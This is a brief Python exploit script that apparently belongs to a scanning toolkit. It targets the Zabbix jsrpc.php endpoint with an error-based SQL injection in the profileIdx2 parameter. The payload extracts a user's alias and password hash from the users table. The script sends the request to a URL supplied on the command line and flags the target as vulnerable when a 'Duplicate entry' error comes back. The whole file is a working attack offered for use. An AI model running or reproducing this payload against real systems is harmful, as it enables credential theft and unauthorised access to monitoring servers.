#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload = '/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=(select (1) from users where 1=1 aNd (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((Select (select concat(alias,0x7e,passwd,0x7e) from users limit 1)),1,62)))a from information_schema.tables group by a)b))&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17'
bug = '[Duplicate entry \''
info = '|zabbix_jsrpc_sql_inject'

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(url+info)#,GettextMiddle(res[0],"Duplicate entry '","~' for key"));

main()
